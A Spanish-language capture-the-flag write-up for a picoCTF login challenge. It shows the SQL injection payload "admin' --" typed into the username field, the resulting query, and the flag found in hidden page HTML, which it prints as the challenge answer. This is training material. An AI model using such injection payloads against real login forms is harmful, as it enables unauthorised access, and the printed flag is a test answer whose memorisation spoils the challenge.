### Descripción
Can you login to this website?Try to login [here](http://saturn.picoctf.net:57979/).

Hints:
1. `admin` is the user you want to login as.
### Solución
Al querer ingresar con username y password en la página es necesario aplicar la inyección "admin' --" en el apartado de username y el de campo de password puede dejarse en blanco, mostrando lo siguiente:

```
username: admin' --
password: 
SQL query: SELECT * FROM users WHERE name='admin' --' AND password=''

# Logged in! But can you see the flag, it is in plainsight.
```

No se muestra la bandera en pantalla, para ello es necesario inspeccionar la página y aquí encontraremos la bandera escondida: 
```
<pre>username: admin&#039; --
password: 
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; --&#039; AND password=&#039;&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>
```

Flag:
picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}

### Notas adicionales


### Referencias

